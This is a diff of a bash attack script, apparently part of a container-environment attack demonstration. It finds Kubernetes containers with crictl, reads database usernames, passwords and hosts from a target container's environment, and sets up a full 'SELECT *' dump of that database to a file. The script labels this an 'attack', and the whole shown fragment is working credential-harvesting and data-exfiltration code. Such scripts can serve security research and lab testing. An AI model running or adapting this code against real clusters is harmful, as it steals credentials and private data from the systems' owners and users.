@@ -18,26 +18,25 @@ if [[ ${#CIDS[@]} -eq 0 ]]; then
   exit 0
 fi
 
-echo "Found ${#CIDS[@]} containers. Running query…"
+echo "Found ${#CIDS[@]} containers. Running query..."
 # --- DB REMOTE IN CONTAINER 'currency' ---
 mapfile -t CIDC < <(crictl ps -q --name currency)
 if [[ ${#CIDC[@]} -eq 0 ]]; then
   echo "No container currency found"
 else
-  echo "DB currency attack (${#CIDC[@]} container). Run query…"
+  echo "DB currency attack (${#CIDC[@]} container). Run query..."
   for CID_CUR in "${CIDC[@]}"; do
     if ! INSPECT_JSON=$(crictl inspect "$CID_CUR"); then
       echo "   [SKIP] inspect failed for $CID_CUR" >&2
       continue
     fi
 
-    read -r USERC DBC PASSC HOSTC PORTC < <(printf '%s' "$INSPECT_JSON" \
-      | jq -r '
-        .info.config.envs
-        | (map({(.key): .value}) | add) as $e
-        | "\($e.DB_USER) \($e.DB_NAME) \($e.DB_PASS) \($e.DB_HOST) \($e.DB_PORT)"
-      ')
-
+    # Extract DB credentials from env variables to proceed the attack
+    USERC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_USER"{print $2}')
+    PASSC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_PASS"{print $2}')
+    DBC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_NAME"{print $2}')
+    HOSTC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_HOST"{print $2}')
+    PORTC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_PORT"{print $2}')
     HOSTC="${HOSTC%%.*}"
     QUERY="SELECT * FROM $DBC;"
     OUTFILE="$OUTDIR/currencyDB-${CID_CUR:0:12}.txt"
